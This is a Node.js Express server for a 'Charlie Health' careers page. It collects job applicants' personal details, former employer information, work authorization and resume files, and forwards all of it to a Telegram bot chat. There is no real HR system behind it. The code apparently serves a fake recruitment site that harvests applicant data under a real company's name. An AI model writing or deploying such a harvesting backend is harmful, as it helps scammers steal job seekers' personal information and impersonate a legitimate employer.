require('dotenv').config();

const express = require('express');
const multer = require('multer');
const path = require('path');

const app = express();
const port = Number(process.env.PORT || 4173);
const hasTelegramConfig = Boolean(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID);

app.use((request, response, next) => {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (request.method === 'OPTIONS') {
    return response.sendStatus(204);
  }
  return next();
});

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 10 * 1024 * 1024 },
  fileFilter: (request, file, callback) => {
    const allowedExtensions = /\.(pdf|doc|docx)$/i;
    if (!allowedExtensions.test(path.extname(file.originalname))) {
      return callback(new Error('Resume must be a PDF, DOC, or DOCX file under 10 MB'));
    }
    return callback(null, true);
  }
});

const allowedFields = [
  'applicationId', 'jobId', 'jobDepartment', 'jobTitle', 'jobPay', 'position', 'firstName', 'lastName', 'email', 'phone',
  'city', 'state', 'location', 'employmentType', 'startDate', 'workAuthorization', 'schedule',
  'hourlyRate', 'relevantExperience', 'previousEmployer', 'previousRole', 'employerAddress',
  'employerPhone', 'employerEmail', 'yearsExperience', 'experienceDetails', 'remoteExperience',
  'education', 'additionalInfo', 'interviewDate', 'interviewTime', 'timeZone', 'schedulingNotes', 'certification'
];

const value = (body, key) => String(body[key] || '—').trim();

const formatApplication = (body, file) => {
  const lines = [
    `New Charlie Health application: ${value(body, 'applicationId')}`,
    `Role: ${value(body, 'jobTitle')}`,
    `Department: ${value(body, 'jobDepartment')}`,
    `Pay: ${value(body, 'jobPay')}`,
    '',
    'PERSONAL INFORMATION',
    `Name: ${value(body, 'firstName')} ${value(body, 'lastName')}`,
    `Email: ${value(body, 'email')}`,
    `Phone: ${value(body, 'phone')}`,
    `Location: ${value(body, 'city')}, ${value(body, 'state')}`,
    '',
    'ROLE PREFERENCES',
    `Position: ${value(body, 'position')}`,
    `Work location: ${value(body, 'location')}`,
    `Employment type: ${value(body, 'employmentType')}`,
    `Start availability: ${value(body, 'startDate')}`,
    `US work authorization: ${value(body, 'workAuthorization')}`,
    `Preferred schedule: ${value(body, 'schedule')}`,
    `Expected hourly rate: ${value(body, 'hourlyRate')}`,
    '',
    'EXPERIENCE',
    `Relevant experience: ${value(body, 'relevantExperience')}`,
    `Previous employer: ${value(body, 'previousEmployer')}`,
    `Previous role: ${value(body, 'previousRole')}`,
    `Employer address: ${value(body, 'employerAddress')}`,
    `Employer phone: ${value(body, 'employerPhone')}`,
    `Employer email: ${value(body, 'employerEmail')}`,
    `Years of experience: ${value(body, 'yearsExperience')}`,
    `Remote experience: ${value(body, 'remoteExperience')}`,
    `Education: ${value(body, 'education')}`,
    `Experience details: ${value(body, 'experienceDetails')}`,
    `Additional information: ${value(body, 'additionalInfo')}`,
    '',
    'INTERVIEW',
    `Preferred date: ${value(body, 'interviewDate')}`,
    `Preferred time: ${value(body, 'interviewTime')}`,
    `Time zone: ${value(body, 'timeZone')}`,
    `Scheduling notes: ${value(body, 'schedulingNotes')}`,
    '',
    `Application certification: ${value(body, 'certification') === 'on' ? 'Confirmed' : 'Not confirmed'}`,
    `Resume: ${file ? file.originalname : 'Not provided'}`
  ];
  return lines.join('\n');
};

const sendToTelegram = async (body, file) => {
  if (!hasTelegramConfig) {
    console.warn('Telegram environment variables are not configured; accepting the application locally without sending it to Telegram.');
    return;
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  const apiBase = `https://api.telegram.org/bot${token}`;
  const messageResponse = await fetch(`${apiBase}/sendMessage`, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: formatApplication(body, file) })
  });
  if (!messageResponse.ok) throw new Error('Telegram message request failed');

  if (file) {
    const telegramForm = new FormData();
    telegramForm.append('chat_id', chatId);
    telegramForm.append('caption', `Resume: ${value(body, 'jobTitle')} - ${value(body, 'firstName')} ${value(body, 'lastName')}`);
    telegramForm.append('document', new Blob([file.buffer], { type: file.mimetype }), file.originalname);
    const fileResponse = await fetch(`${apiBase}/sendDocument`, { method: 'POST', body: telegramForm });
    if (!fileResponse.ok) throw new Error('Telegram file request failed');
  }
};

app.use(express.static(__dirname));

app.post('/api/applications', upload.single('resume'), async (request, response) => {
  try {
    const application = Object.fromEntries(allowedFields.map((field) => [field, value(request.body, field)]));
    await sendToTelegram(application, request.file);
    response.status(201).json({ ok: true, applicationId: application.applicationId });
  } catch (error) {
    console.error('Application submission failed:', error.message);
    response.status(500).json({ ok: false, error: 'Application could not be submitted' });
  }
});

app.use((error, request, response, next) => {
  if (error instanceof multer.MulterError || error.message === 'Unexpected field') {
    return response.status(400).json({ ok: false, error: 'Resume must be a PDF, DOC, or DOCX file under 10 MB' });
  }
  return next(error);
});

app.listen(port, () => {
  console.log(`Charlie Health careers server listening on http://localhost:${port}`);
});
